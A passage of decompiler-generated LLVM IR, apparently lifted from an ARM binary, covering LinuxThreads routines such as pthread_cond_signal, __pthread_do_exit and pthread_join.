  %v2_ea7c = icmp eq i8 %v3_ea78, 0
  br i1 %v2_ea7c, label %dec_label_pc_ea98, label %dec_label_pc_ea88

dec_label_pc_ea88:                                ; preds = %dec_label_pc_ea74, %dec_label_pc_ea34
  %v0_ea8c = load i32, i32* @r5, align 4
  %v1_ea8c = add i32 %v0_ea8c, 8
  %v2_ea90 = call i32 @_enqueue(i32 %v1_ea8c, i32 %v0_ea08)
  br label %dec_label_pc_ea98

dec_label_pc_ea98:                                ; preds = %dec_label_pc_ea74, %dec_label_pc_ea88
  %storemerge = phi i32 [ 0, %dec_label_pc_ea88 ], [ 1, %dec_label_pc_ea74 ]
  store i32 %storemerge, i32* @r4, align 4
  %v0_ea98 = load i32, i32* @r5, align 4
  %v1_ea9c = call i32 @__pthread_unlock(i32 %v0_ea98)
  %v0_eaa0 = load i32, i32* @r4, align 4
  %v2_eaa0 = icmp eq i32 %v0_eaa0, 0
  br i1 %v2_eaa0, label %dec_label_pc_eab8, label %dec_label_pc_eaa8

dec_label_pc_eaa8:                                ; preds = %dec_label_pc_ea98
  %v2_eab0 = call i32 @___pthread_set_own_extricate_if(i32 %v0_ea08, i32 0)
  br label %dec_label_pc_eb4c

dec_label_pc_eab8:                                ; preds = %dec_label_pc_ea98
  %v0_eab8 = load i32, i32* @r6, align 4
  store i32 %v0_eab8, i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_eac8.459 to i32), i32* @lr, align 4
  %v1_eac4 = call i32 @pthread_mutex_unlock()
  store i32 %v0_ea08, i32* @r0, align 4
  %v1_eacc9 = call i32 @_suspend.7(i32 %v0_ea08)
  %v3_ead410 = load i8, i8* %v4_ea48, align 1
  %v2_ead812 = icmp eq i8 %v3_ead410, 0
  %v1_eae4 = add i32 %v0_ea08, 440
  %v2_eae4 = inttoptr i32 %v1_eae4 to i8*
  br i1 %v2_ead812, label %dec_label_pc_eae0.lr.ph, label %dec_label_pc_eb08

dec_label_pc_eae0.lr.ph:                          ; preds = %dec_label_pc_eab8
  %v1_eaf4 = add i32 %v0_ea08, 64
  %v2_eaf4 = inttoptr i32 %v1_eaf4 to i8*
  br label %dec_label_pc_eae0

dec_label_pc_eae0:                                ; preds = %dec_label_pc_eae0.lr.ph, %dec_label_pc_eb00
  %v3_eae4 = load i8, i8* %v2_eae4, align 1
  %v2_eae8 = icmp eq i8 %v3_eae4, 0
  br i1 %v2_eae8, label %dec_label_pc_eb00, label %dec_label_pc_eaf0

dec_label_pc_eaf0:                                ; preds = %dec_label_pc_eae0
  %v3_eaf4 = load i8, i8* %v2_eaf4, align 1
  %v2_eaf8 = icmp eq i8 %v3_eaf4, 0
  br i1 %v2_eaf8, label %dec_label_pc_eb08, label %dec_label_pc_eb00

dec_label_pc_eb00:                                ; preds = %dec_label_pc_eaf0, %dec_label_pc_eae0
  %v0_eb00 = load i32, i32* @r4, align 4
  %v1_eb00 = add i32 %v0_eb00, 1
  store i32 %v1_eb00, i32* @r4, align 4
  store i32 %v0_ea08, i32* @r0, align 4
  %v1_eacc = call i32 @_suspend.7(i32 %v0_ea08)
  %v3_ead4 = load i8, i8* %v4_ea48, align 1
  %v2_ead8 = icmp eq i8 %v3_ead4, 0
  br i1 %v2_ead8, label %dec_label_pc_eae0, label %dec_label_pc_eb08

dec_label_pc_eb08:                                ; preds = %dec_label_pc_eaf0, %dec_label_pc_eb00, %dec_label_pc_eab8
  %v2_eb10 = call i32 @___pthread_set_own_extricate_if(i32 %v0_ea08, i32 0)
  %v3_eb18 = load i8, i8* %v2_eae4, align 1
  %v2_eb1c = icmp eq i8 %v3_eb18, 0
  br i1 %v2_eb1c, label %dec_label_pc_eb60, label %dec_label_pc_eb24

dec_label_pc_eb24:                                ; preds = %dec_label_pc_eb08
  %v1_eb28 = add i32 %v0_ea08, 64
  %v2_eb28 = inttoptr i32 %v1_eb28 to i8*
  %v3_eb28 = load i8, i8* %v2_eb28, align 1
  %v4_eb28 = zext i8 %v3_eb28 to i32
  store i32 %v4_eb28, i32* @r2, align 4
  %v2_eb2c = icmp eq i8 %v3_eb28, 0
  br i1 %v2_eb2c, label %dec_label_pc_eb34, label %dec_label_pc_eb60

dec_label_pc_eb34:                                ; preds = %dec_label_pc_eb24
  %v0_eb38 = load i32, i32* @r6, align 4
  store i8 0, i8* %v2_eae4, align 1
  store i32 60236, i32* @lr, align 4
  %v2_eb48 = call i32 @pthread_mutex_lock(i32 %v0_eb38)
  br label %dec_label_pc_eb4c

dec_label_pc_eb4c:                                ; preds = %dec_label_pc_eaa8, %dec_label_pc_eb34
  %v2_eb54 = call i32 @__pthread_do_exit(i32 -1, i32 %v2_e9fc)
  br label %dec_label_pc_eb58

dec_label_pc_eb58:                                ; preds = %dec_label_pc_eb60, %dec_label_pc_eb4c
  store i32 %v0_ea08, i32* @r0, align 4
  %v1_eb5c = call i32 @_restart(i32 %v0_ea08)
  br label %dec_label_pc_eb60

dec_label_pc_eb60:                                ; preds = %dec_label_pc_eb24, %dec_label_pc_eb08, %dec_label_pc_eb58
  %v0_eb60 = load i32, i32* @r4, align 4
  %v1_eb60 = add i32 %v0_eb60, -1
  store i32 %v1_eb60, i32* @r4, align 4
  %v2_eb60 = icmp eq i32 %v0_eb60, 0
  br i1 %v2_eb60, label %dec_label_pc_eb68, label %dec_label_pc_eb58

dec_label_pc_eb68:                                ; preds = %dec_label_pc_eb60
  %v0_eb68 = load i32, i32* @r6, align 4
  store i32 60280, i32* @lr, align 4
  %v2_eb74 = call i32 @pthread_mutex_lock(i32 %v0_eb68)
  br label %dec_label_pc_eb7c

dec_label_pc_eb7c:                                ; preds = %dec_label_pc_ea20, %dec_label_pc_eb68
  %storemerge25 = phi i32 [ 0, %dec_label_pc_eb68 ], [ 22, %dec_label_pc_ea20 ]
  store i32 %v3_e9f8, i32* @r4, align 4
  store i32 %v6_e9f8, i32* @r5, align 4
  ret i32 %storemerge25

; uselistorder directives
  uselistorder i8* %v4_ea48, { 1, 0, 2 }
  uselistorder i32 %v0_ea08, { 0, 1, 9, 10, 14, 13, 11, 12, 16, 15, 8, 6, 7, 4, 5, 3, 2, 17, 18 }
  uselistorder i32 (i32)* @_suspend.7, { 2, 0, 1 }
  uselistorder i32 (i32, i32)* @_enqueue, { 1, 0 }
  uselistorder i32 (i32, i32)* @___pthread_set_own_extricate_if, { 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 ()* @_thread_self.6, { 1, 0, 2 }
  uselistorder label %dec_label_pc_eb7c, { 1, 0 }
  uselistorder label %dec_label_pc_eb60, { 2, 0, 1 }
  uselistorder label %dec_label_pc_eb4c, { 1, 0 }
  uselistorder label %dec_label_pc_eb08, { 1, 0, 2 }
  uselistorder label %dec_label_pc_eae0, { 1, 0 }
  uselistorder label %dec_label_pc_ea98, { 1, 0 }
  uselistorder label %dec_label_pc_ea34, { 1, 2, 0 }
}

define i32 @pthread_cond_signal(i32 %arg1) local_unnamed_addr {
entry:
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r5.global-to-local, align 4
  %v2_eb9c = call i32 @__pthread_lock(i32 %arg1, i32 0)
  %v1_eba0 = add i32 %arg1, 8
  %v2_eba0 = inttoptr i32 %v1_eba0 to i32*
  %v3_eba0 = load i32, i32* %v2_eba0, align 4
  store i32 %v3_eba0, i32* @r4, align 4
  %v2_eba4 = icmp eq i32 %v3_eba0, 0
  br i1 %v2_eba4, label %.thread2, label %bb

bb:                                               ; preds = %entry
  %v2_eba8 = add i32 %v3_eba0, 8
  %v3_eba8 = inttoptr i32 %v2_eba8 to i32*
  %v4_eba8 = load i32, i32* %v3_eba8, align 4
  store i32 %v4_eba8, i32* %v2_eba0, align 4
  %v2_ebb4 = load i32, i32* @r4, align 4
  %v3_ebb4 = add i32 %v2_ebb4, 8
  %v4_ebb4 = inttoptr i32 %v3_ebb4 to i32*
  store i32 0, i32* %v4_ebb4, align 4
  %v0_ebb8.pre = load i32, i32* %r5.global-to-local, align 4
  br label %.thread2

.thread2:                                         ; preds = %entry, %bb
  %v0_ebb8 = phi i32 [ %arg1, %entry ], [ %v0_ebb8.pre, %bb ]
  %v1_ebbc = call i32 @__pthread_unlock(i32 %v0_ebb8)
  %v0_ebc0 = load i32, i32* @r4, align 4
  %v2_ebc0 = icmp eq i32 %v0_ebc0, 0
  br i1 %v2_ebc0, label %dec_label_pc_ebd8, label %dec_label_pc_ebc8

dec_label_pc_ebc8:                                ; preds = %.thread2
  %v3_ebcc = add i32 %v0_ebc0, 441
  %v4_ebcc = inttoptr i32 %v3_ebcc to i8*
  store i8 1, i8* %v4_ebcc, align 1
  %v0_ebd0 = load i32, i32* @r4, align 4
  store i32 %v0_ebd0, i32* @r0, align 4
  %v1_ebd4 = call i32 @_restart(i32 %v0_ebd0)
  br label %dec_label_pc_ebd8

dec_label_pc_ebd8:                                ; preds = %.thread2, %dec_label_pc_ebc8
  ret i32 0

; uselistorder directives
  uselistorder i32 (i32)* @_restart, { 3, 2, 1, 0 }
  uselistorder i32 %arg1, { 1, 0, 3, 2 }
  uselistorder label %dec_label_pc_ebd8, { 1, 0 }
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @__linuxthreads_create_event() local_unnamed_addr {
entry:
  %v1_ebe0 = load i32, i32* @r0, align 4
  ret i32 %v1_ebe0
}

define i32 @__linuxthreads_death_event(i32 %arg1) local_unnamed_addr {
entry:
  %v1_ebe4 = load i32, i32* @r0, align 4
  ret i32 %v1_ebe4
}

define i32 @__linuxthreads_reap_event(i32 %arg1) local_unnamed_addr {
entry:
  %v1_ebe8 = load i32, i32* @r0, align 4
  ret i32 %v1_ebe8
}

define i32 @___pthread_set_own_extricate_if.8(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_ebec = load i32, i32* @r4, align 4
  store i32 %v3_ebec, i32* %stack_var_-12, align 4
  %v9_ebec = load i32, i32* @lr, align 4
  store i32 %arg2, i32* %r5.global-to-local, align 4
  %v2_ebf0 = icmp eq i32 %arg2, 0
  %v0_ebf4 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_ebf4, i32* %r4.global-to-local, align 4
  br i1 %v2_ebf0, label %dec_label_pc_ec10, label %dec_label_pc_ec00

dec_label_pc_ec00:                                ; preds = %entry
  %v1_ec00 = add i32 %v0_ebf4, 64
  %v2_ec00 = inttoptr i32 %v1_ec00 to i8*
  %v3_ec00 = load i8, i8* %v2_ec00, align 1
  %v2_ec04 = icmp eq i8 %v3_ec00, 0
  br i1 %v2_ec04, label %dec_label_pc_ec18, label %bb

bb:                                               ; preds = %dec_label_pc_ec00
  store i32 %v3_ebec, i32* @r4, align 4
  ret i32 %v0_ebf4

dec_label_pc_ec10:                                ; preds = %entry
  %v1_ec10 = add i32 %v0_ebf4, 28
  %v2_ec10 = inttoptr i32 %v1_ec10 to i32*
  %v3_ec10 = load i32, i32* %v2_ec10, align 4
  store i32 %v3_ec10, i32* %r0.global-to-local, align 4
  %v2_ec14 = call i32 @__pthread_lock(i32 %v3_ec10, i32 %v0_ebf4)
  store i32 %v2_ec14, i32* %r0.global-to-local, align 4
  %v0_ec18.pre = load i32, i32* %r5.global-to-local, align 4
  %v1_ec1c.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_ec18

dec_label_pc_ec18:                                ; preds = %dec_label_pc_ec00, %dec_label_pc_ec10
  %v1_ec1c = phi i32 [ %v0_ebf4, %dec_label_pc_ec00 ], [ %v1_ec1c.pre, %dec_label_pc_ec10 ]
  %v0_ec1c = phi i32 [ %arg2, %dec_label_pc_ec00 ], [ %v0_ec18.pre, %dec_label_pc_ec10 ]
  %v2_ec18 = icmp eq i32 %v0_ec1c, 0
  %v2_ec1c = add i32 %v1_ec1c, 444
  %v3_ec1c = inttoptr i32 %v2_ec1c to i32*
  store i32 %v0_ec1c, i32* %v3_ec1c, align 4
  br i1 %v2_ec18, label %bb7, label %bb6

bb6:                                              ; preds = %dec_label_pc_ec18
  %v3_ec20 = load i32, i32* %stack_var_-12, align 4
  store i32 %v3_ec20, i32* @r4, align 4
  %v12_ec20 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v12_ec20

bb7:                                              ; preds = %dec_label_pc_ec18
  %v0_ec24 = load i32, i32* %r4.global-to-local, align 4
  %v1_ec24 = add i32 %v0_ec24, 28
  %v2_ec24 = inttoptr i32 %v1_ec24 to i32*
  %v3_ec24 = load i32, i32* %v2_ec24, align 4
  store i32 %v3_ec24, i32* %r0.global-to-local, align 4
  %v2_ec28 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_ec28, i32* @r4, align 4
  store i32 %v9_ebec, i32* @lr, align 4
  %v1_ec2c = call i32 @__pthread_unlock(i32 %v3_ec24)
  store i32 %v1_ec2c, i32* %r0.global-to-local, align 4
  ret i32 %v1_ec2c

; uselistorder directives
  uselistorder i32 %v0_ebf4, { 0, 4, 2, 1, 3, 5 }
  uselistorder i32* %r0.global-to-local, { 6, 2, 4, 5, 3, 0, 1 }
  uselistorder label %dec_label_pc_ec18, { 1, 0 }
}

define i32 @_thread_self.9() local_unnamed_addr {
entry:
  %stack_var_0 = alloca i32, align 4
  %v2_ec34 = load i32, i32* @global_var_2b16c.177, align 4
  %v0_ec38 = load i32, i32* @sp, align 4
  %v3_ec38 = icmp ult i32 %v0_ec38, %v2_ec34
  %v1_ec3c = ptrtoint i32* %stack_var_0 to i32
  br i1 %v3_ec38, label %bb3, label %bb

bb:                                               ; preds = %dec_label_pc_ec58, %entry
  %merge = phi i32 [ ptrtoint (i32* @global_var_2a3e0 to i32), %entry ], [ ptrtoint (i32* @global_var_2a5c0.184 to i32), %dec_label_pc_ec58 ]
  ret i32 %merge

bb3:                                              ; preds = %entry
  %v2_ec4c = load i32, i32* @global_var_2b170.180, align 4
  %v3_ec50 = icmp ult i32 %v0_ec38, %v2_ec4c
  br i1 %v3_ec50, label %bb4, label %dec_label_pc_ec58

dec_label_pc_ec58:                                ; preds = %bb3
  %v2_ec5c = load i32, i32* @global_var_2b174.182, align 4
  %v3_ec60 = icmp ult i32 %v0_ec38, %v2_ec5c
  br i1 %v3_ec60, label %bb, label %bb4

bb4:                                              ; preds = %dec_label_pc_ec58, %bb3
  %v2_ec70 = load i32, i32* @global_var_2f558.186, align 4
  %v3_ec74 = and i32 %v1_ec3c, -2097152
  %v4_ec74 = xor i32 %v3_ec74, -2097152
  %v2_ec7c = icmp eq i32 %v2_ec70, 0
  %v1_ec80 = sub i32 -477, %v4_ec74
  br i1 %v2_ec7c, label %dec_label_pc_ec8c, label %dec_label_pc_ec88

dec_label_pc_ec88:                                ; preds = %bb4
  %v1_ec88 = call i32 @__pthread_find_self(i32 %v1_ec80)
  br label %dec_label_pc_ec8c

dec_label_pc_ec8c:                                ; preds = %bb4, %dec_label_pc_ec88
  %v0_ec8c = phi i32 [ %v1_ec80, %bb4 ], [ %v1_ec88, %dec_label_pc_ec88 ]
  %v1_ec8c = add i32 %v0_ec8c, -3
  ret i32 %v1_ec8c

; uselistorder directives
  uselistorder i32 %v1_ec80, { 1, 0 }
  uselistorder label %dec_label_pc_ec8c, { 1, 0 }
}

define i32 @join_extricate_func(i32 %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %v0_ecb8 = call i32 @_thread_self.9()
  %v2_ecc8 = call i32 @__pthread_lock(i32 %arg1, i32 %v0_ecb8)
  %v1_eccc = add i32 %arg1, 8
  %v2_eccc = inttoptr i32 %v1_eccc to i32*
  %v3_eccc = load i32, i32* %v2_eccc, align 4
  %v1_ecd4 = add i32 %v3_eccc, 56
  %v2_ecd4 = inttoptr i32 %v1_ecd4 to i32*
  %v3_ecd4 = load i32, i32* %v2_ecd4, align 4
  store i32 %v3_ecd4, i32* %r4.global-to-local, align 4
  store i32 0, i32* %v2_ecd4, align 4
  %v1_ece0 = call i32 @__pthread_unlock(i32 %arg1)
  %v0_ece4 = load i32, i32* %r4.global-to-local, align 4
  %v2_ece4 = icmp eq i32 %v0_ece4, 0
  br i1 %v2_ece4, label %bb6, label %bb

bb:                                               ; preds = %entry
  store i32 1, i32* %r4.global-to-local, align 4
  br label %bb6

bb6:                                              ; preds = %entry, %bb
  %v0_ecec = phi i32 [ 0, %entry ], [ 1, %bb ]
  ret i32 %v0_ecec

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %bb6, { 1, 0 }
}

define i32 @_suspend.10(i32 %arg1) local_unnamed_addr {
entry:
  %v0_ecf8 = load i32, i32* @r0, align 4
  %v1_ecf8 = call i32 @__pthread_wait_for_restart_signal(i32 %v0_ecf8)
  ret i32 %v1_ecf8

; uselistorder directives
  uselistorder i32 (i32)* @__pthread_wait_for_restart_signal, { 2, 6, 1, 5, 4, 3, 0 }
}

define i32 @__pthread_do_exit(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-148 = alloca i32, align 4
  %v2_ecfc = ptrtoint i32* %stack_var_-148 to i32
  store i32 %arg2, i32* @r4, align 4
  store i32 %arg1, i32* @r5, align 4
  %v0_ed08 = call i32 @_thread_self.9()
  %v3_ed10 = add i32 %v0_ed08, 64
  %v4_ed10 = inttoptr i32 %v3_ed10 to i8*
  store i8 1, i8* %v4_ed10, align 1
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 %v0_ed08, i32* @r6, align 4
  %v3_ed1c = add i32 %v0_ed08, 65
  %v4_ed1c = inttoptr i32 %v3_ed1c to i8*
  store i8 0, i8* %v4_ed1c, align 1
  %v0_ed20 = load i32, i32* @r4, align 4
  %v1_ed24 = call i32 @__pthread_perform_cleanup(i32 %v0_ed20)
  %v1_ed28 = call i32 @__pthread_destroy_specifics(i32 %v1_ed24)
  %v0_ed2c = load i32, i32* @r6, align 4
  %v1_ed2c = add i32 %v0_ed2c, 28
  %v2_ed2c = inttoptr i32 %v1_ed2c to i32*
  %v3_ed2c = load i32, i32* %v2_ed2c, align 4
  %v2_ed34 = call i32 @__pthread_lock(i32 %v3_ed2c, i32 %v0_ed2c)
  store i32 %v2_ed34, i32* @r0, align 4
  %v0_ed38 = load i32, i32* @r6, align 4
  %v1_ed38 = add i32 %v0_ed38, 412
  %v2_ed38 = inttoptr i32 %v1_ed38 to i32*
  %v3_ed38 = load i32, i32* %v2_ed38, align 4
  store i32 %v3_ed38, i32* %r3.global-to-local, align 4
  %v2_ed3c = icmp eq i32 %v3_ed38, 0
  %v0_ed40 = load i32, i32* @r5, align 4
  %v2_ed40 = add i32 %v0_ed38, 48
  %v3_ed40 = inttoptr i32 %v2_ed40 to i32*
  store i32 %v0_ed40, i32* %v3_ed40, align 4
  br i1 %v2_ed3c, label %dec_label_pc_ed78, label %dec_label_pc_ed48

dec_label_pc_ed48:                                ; preds = %entry
  store i32 ptrtoint (i32* @global_var_2f55c.213 to i32), i32* %r3.global-to-local, align 4
  %v0_ed4c = load i32, i32* @r6, align 4
  %v1_ed4c = add i32 %v0_ed4c, 416
  %v2_ed4c = inttoptr i32 %v1_ed4c to i32*
  %v3_ed4c = load i32, i32* %v2_ed4c, align 4
  %v2_ed50 = load i32, i32* @global_var_2f55c.213, align 4
  %v2_ed54 = or i32 %v2_ed50, %v3_ed4c
  store i32 %v2_ed54, i32* %r3.global-to-local, align 4
  %v1_ed58 = and i32 %v2_ed54, 256
  %v2_ed58 = icmp eq i32 %v1_ed58, 0
  br i1 %v2_ed58, label %dec_label_pc_ed78, label %dec_label_pc_ed60

dec_label_pc_ed60:                                ; preds = %dec_label_pc_ed48
  %v2_ed64 = add i32 %v0_ed4c, 424
  %v3_ed64 = inttoptr i32 %v2_ed64 to i32*
  store i32 9, i32* %v3_ed64, align 4
  store i32 ptrtoint (i32* @global_var_2f564.215 to i32), i32* %r3.global-to-local, align 4
  %v0_ed6c = load i32, i32* @r6, align 4
  %v2_ed6c = add i32 %v0_ed6c, 428
  %v3_ed6c = inttoptr i32 %v2_ed6c to i32*
  store i32 %v0_ed6c, i32* %v3_ed6c, align 4
  %v0_ed70 = load i32, i32* @r6, align 4
  %v1_ed70 = load i32, i32* %r3.global-to-local, align 4
  %v2_ed70 = inttoptr i32 %v1_ed70 to i32*
  store i32 %v0_ed70, i32* %v2_ed70, align 4
  %v1_ed74 = call i32 @__linuxthreads_death_event(i32 %v2_ed34)
  br label %dec_label_pc_ed78

dec_label_pc_ed78:                                ; preds = %dec_label_pc_ed48, %entry, %dec_label_pc_ed60
  %v0_ed78 = load i32, i32* @r6, align 4
  %v1_ed78 = add i32 %v0_ed78, 56
  %v2_ed78 = inttoptr i32 %v1_ed78 to i32*
  %v3_ed78 = load i32, i32* %v2_ed78, align 4
  store i32 %v3_ed78, i32* %r4.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v3_ed80 = add i32 %v0_ed78, 44
  %v4_ed80 = inttoptr i32 %v3_ed80 to i8*
  store i8 1, i8* %v4_ed80, align 1
  %v0_ed84 = load i32, i32* @r6, align 4
  %v1_ed84 = add i32 %v0_ed84, 28
  %v2_ed84 = inttoptr i32 %v1_ed84 to i32*
  %v3_ed84 = load i32, i32* %v2_ed84, align 4
  %v1_ed88 = call i32 @__pthread_unlock(i32 %v3_ed84)
  %v0_ed8c = load i32, i32* %r4.global-to-local, align 4
  %v2_ed8c = icmp eq i32 %v0_ed8c, 0
  br i1 %v2_ed8c, label %bb3, label %bb

bb:                                               ; preds = %dec_label_pc_ed78
  br label %bb3

bb3:                                              ; preds = %dec_label_pc_ed78, %bb
  store i32 60824, i32* @lr, align 4
  %v1_ed94 = xor i1 %v2_ed8c, true
  call void @__pseudo_cond_branch(i1 %v1_ed94, i32 ptrtoint (i32* @global_var_d674.469 to i32))
  store i32 ptrtoint (i32** @global_var_2a7a0.197 to i32), i32* %r3.global-to-local, align 4
  %v2_ed9c = load i32, i32* bitcast (i32** @global_var_2a7a0.197 to i32*), align 4
  store i32 %v2_ed9c, i32* @r4, align 4
  %v0_eda0 = load i32, i32* @r6, align 4
  %v9_eda0 = icmp eq i32 %v0_eda0, %v2_ed9c
  br i1 %v9_eda0, label %dec_label_pc_eda8, label %dec_label_pc_ee00

dec_label_pc_eda8:                                ; preds = %bb3
  %v2_edac = load i32, i32* @global_var_2a7a4.195, align 4
  store i32 %v2_edac, i32* %r3.global-to-local, align 4
  %v1_edb0 = icmp slt i32 %v2_edac, 0
  br i1 %v1_edb0, label %dec_label_pc_ee00, label %dec_label_pc_edb8

dec_label_pc_edb8:                                ; preds = %dec_label_pc_eda8
  store i32 3, i32* %r3.global-to-local, align 4
  store i32 %v2_ed9c, i32* %stack_var_-148, align 4
  br label %dec_label_pc_edc4

dec_label_pc_edc4:                                ; preds = %dec_label_pc_ede0.dec_label_pc_edc4_crit_edge, %dec_label_pc_edb8
  %v2_edcc = phi i32 [ %v2_edcc.pre, %dec_label_pc_ede0.dec_label_pc_edc4_crit_edge ], [ %v2_edac, %dec_label_pc_edb8 ]
  store i32 ptrtoint (i32* @global_var_2a7a4.195 to i32), i32* %r3.global-to-local, align 4
  store i32 %v2_ecfc, i32* @r1, align 4
  store i32 %v2_edcc, i32* @r0, align 4
  store i32 148, i32* @r2, align 4
  %v2_edd4 = call i32 @__libc_write(i32 %v2_edcc, i32 %v2_ecfc)
  %v3_edd8 = icmp eq i32 %v2_edd4, -1
  br i1 %v3_edd8, label %dec_label_pc_ede0, label %dec_label_pc_edf0

dec_label_pc_ede0:                                ; preds = %dec_label_pc_edc4
  %v0_ede0 = call i32 @__errno_location()
  %v1_ede4 = inttoptr i32 %v0_ede0 to i32*
  %v2_ede4 = load i32, i32* %v1_ede4, align 4
  store i32 %v2_ede4, i32* %r3.global-to-local, align 4
  %v7_ede8 = icmp eq i32 %v2_ede4, 4
  br i1 %v7_ede8, label %dec_label_pc_ede0.dec_label_pc_edc4_crit_edge, label %dec_label_pc_edf0

dec_label_pc_ede0.dec_label_pc_edc4_crit_edge:    ; preds = %dec_label_pc_ede0
  %v2_edcc.pre = load i32, i32* @global_var_2a7a4.195, align 4
  br label %dec_label_pc_edc4

dec_label_pc_edf0:                                ; preds = %dec_label_pc_edc4, %dec_label_pc_ede0
  %v0_edf0 = load i32, i32* @r4, align 4
  store i32 %v0_edf0, i32* @r0, align 4
  %v1_edf4 = call i32 @_suspend.10(i32 %v0_edf0)
  %v1_edfc = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_ee00

dec_label_pc_ee00:                                ; preds = %bb3, %dec_label_pc_eda8, %dec_label_pc_edf0
  %v1_ee04 = call i32 @__GI__exit(i32 0)
  unreachable

; uselistorder directives
  uselistorder i32 %v2_edcc, { 1, 0 }
  uselistorder i32 %v0_ed6c, { 1, 0 }
  uselistorder i32 %v0_ed08, { 1, 0, 2 }
  uselistorder i32 %v2_ecfc, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 3, 2, 4, 5, 6, 7, 8, 9, 10, 11 }
  uselistorder i32* bitcast (i32** @global_var_2a7a0.197 to i32*), { 1, 2, 0, 3, 4, 5, 6, 7, 8, 9, 10 }
  uselistorder i32 428, { 2, 0, 1 }
  uselistorder i32 416, { 2, 0, 1 }
  uselistorder i32 412, { 3, 0, 1, 2 }
  uselistorder i32 65, { 9, 5, 0, 6, 7, 8, 4, 1, 3, 2 }
  uselistorder label %dec_label_pc_ee00, { 2, 1, 0 }
  uselistorder label %dec_label_pc_edf0, { 1, 0 }
  uselistorder label %bb3, { 1, 0 }
  uselistorder label %dec_label_pc_ed78, { 2, 0, 1 }
}

define i32 @pthread_exit() local_unnamed_addr {
entry:
  %stack_var_0 = alloca i32, align 4
  %v1_ee18 = ptrtoint i32* %stack_var_0 to i32
  %v0_ee1c = load i32, i32* @r0, align 4
  %v2_ee1c = call i32 @__pthread_do_exit(i32 %v0_ee1c, i32 %v1_ee18)
  ret i32 %v2_ee1c
}

define i32 @pthread_join(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-184 = alloca i32, align 4
  %v2_ee24 = ptrtoint i32* %stack_var_-184 to i32
  store i32 %arg1, i32* @r7, align 4
  %v0_ee30 = call i32 @_thread_self.9()
  %v0_ee38 = load i32, i32* @r7, align 4
  %v3_ee3c = urem i32 %v0_ee38, 1024
  %v4_ee40 = mul nuw nsw i32 %v3_ee3c, 16
  %v5_ee40 = add i32 %v4_ee40, ptrtoint (i32* @global_var_263c0.205 to i32)
  store i32 %v5_ee40, i32* %stack_var_-36, align 4
  %v2_ee5c = call i32 @__pthread_lock(i32 %v5_ee40, i32 %v0_ee30)
  %v0_ee60 = load i32, i32* @r5, align 4
  %v1_ee60 = add i32 %v0_ee60, 8
  %v2_ee60 = inttoptr i32 %v1_ee60 to i32*
  %v3_ee60 = load i32, i32* %v2_ee60, align 4
  store i32 %v3_ee60, i32* @r4, align 4
  %v2_ee64 = icmp eq i32 %v3_ee60, 0
  br i1 %v2_ee64, label %dec_label_pc_ee78, label %dec_label_pc_ee6c

dec_label_pc_ee6c:                                ; preds = %entry
  %v1_ee6c = add i32 %v3_ee60, 16
  %v2_ee6c = inttoptr i32 %v1_ee6c to i32*
  %v3_ee6c = load i32, i32* %v2_ee6c, align 4
  %v1_ee70 = load i32, i32* @r7, align 4
  %v9_ee70 = icmp eq i32 %v3_ee6c, %v1_ee70
  br i1 %v9_ee70, label %dec_label_pc_ee88, label %dec_label_pc_ee78

dec_label_pc_ee78:                                ; preds = %dec_label_pc_ee6c, %entry
  %v1_ee7c = call i32 @__pthread_unlock(i32 %v0_ee60)
  br label %dec_label_pc_efec

dec_label_pc_ee88:                                ; preds = %dec_label_pc_ee6c
  %v9_ee8c = icmp eq i32 %v3_ee60, %v0_ee30
  br i1 %v9_ee8c, label %dec_label_pc_ee94, label %dec_label_pc_eea4

dec_label_pc_ee94:                                ; preds = %dec_label_pc_ee88
  %v1_ee98 = call i32 @__pthread_unlock(i32 %v0_ee60)
  br label %dec_label_pc_efec

dec_label_pc_eea4:                                ; preds = %dec_label_pc_ee88
  %v1_eea4 = add i32 %v3_ee60, 45
  %v2_eea4 = inttoptr i32 %v1_eea4 to i8*
  %v3_eea4 = load i8, i8* %v2_eea4, align 1
  %v2_eea8 = icmp eq i8 %v3_eea4, 0
  br i1 %v2_eea8, label %dec_label_pc_eeb0, label %dec_label_pc_eebc

dec_label_pc_eeb0:                                ; preds = %dec_label_pc_eea4
  %v1_eeb0 = add i32 %v3_ee60, 56
  %v2_eeb0 = inttoptr i32 %v1_eeb0 to i32*
  %v3_eeb0 = load i32, i32* %v2_eeb0, align 4
  %v2_eeb4 = icmp eq i32 %v3_eeb0, 0
  br i1 %v2_eeb4, label %dec_label_pc_eecc, label %dec_label_pc_eebc

dec_label_pc_eebc:                                ; preds = %dec_label_pc_eea4, %dec_label_pc_eeb0
  %v1_eec0 = call i32 @__pthread_unlock(i32 %v0_ee60)
  br label %dec_label_pc_efec

dec_label_pc_eecc:                                ; preds = %dec_label_pc_eeb0
  %v1_eecc = add i32 %v3_ee60, 44
  %v2_eecc = inttoptr i32 %v1_eecc to i8*
  %v3_eecc = load i8, i8* %v2_eecc, align 1
  %v2_eed0 = icmp eq i8 %v3_eecc, 0
  br i1 %v2_eed0, label %dec_label_pc_eed8, label %dec_label_pc_ef88

dec_label_pc_eed8:                                ; preds = %dec_label_pc_eecc
  %v2_eedc = ptrtoint i32* %stack_var_-36 to i32
